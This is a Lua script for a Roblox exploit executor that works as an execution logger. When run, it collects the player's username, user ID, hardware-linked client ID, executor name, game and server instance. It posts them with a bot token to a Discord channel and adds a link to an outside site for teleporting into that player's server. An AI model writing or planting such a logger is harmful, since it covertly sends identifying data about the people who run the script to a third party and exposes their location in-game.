local HttpService = game:GetService("HttpService")

local http_request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)

local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name

local hwid = game:GetService("RbxAnalyticsService"):GetClientId()

local player = game.Players.LocalPlayer
local exe = identifyexecutor()
local gameId = game.PlaceId
local plyID = player.UserId
local Time = os.date("%Y-%m-%d %H:%M:%S")
local job = tostring(game.JobId)


local response = http_request {
    Url = "https://discord.com/api/v9/channels/" .. getgenv().Authorization.Channel .. "/messages",
    Method = 'POST',
    Headers = {
        ['Authorization'] = 'Bot ' .. getgenv().Authorization.Secret,
        ['Content-Type'] = 'application/json'
    },
    Body = HttpService:JSONEncode({
        content = "",
        embeds = {{
            title = getgenv().Main.Title,
            description = "𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧:\n👤︱**Player:** [" .. player.Name .. "](https://www.roblox.com/users/" .. plyID .. "/profile)\n🎮︱**Game:** [" .. gameName .. "](https://www.roblox.com/games/" .. gameId .. ")\n\n**𝐌𝐢𝐬𝐜 ** \n 💉︱**Executor:** " .. exe .. "\n🔒︱**HWID:** \n" .. hwid .. "\n\n𝐄𝐱𝐞𝐜𝐮𝐭𝐢𝐨𝐧 𝐓𝐢𝐦𝐞:\n" .. Time .. "\n",
            type = "rich",
            color = tonumber(getgenv().Main.ColorEmbed),  -- Convert color to number
            fields = getgenv().field and {
                {
                    name = getgenv().Field.Name,
                    value = getgenv().Field.FieldValue,
                    inline = false
                },
                {
                    name = "",
                    value = "[𝗦𝗻𝗶𝗽𝗲 𝗠𝗲 ❗ Teleport To Place Where Player Executed](https://thehunt.click/?placeId=" .. gameId .. "&gameInstanceId=" .. job .. ")",
                    inline = false
                }
            } or nil,
            footer = {
                text = getgenv().Footer.FooterText,
                icon_url = getgenv().Footer.FooterURL,
            },
            thumbnail = {
                url = getgenv().Main.ThumbnailURL
            }
        }}
    })
}
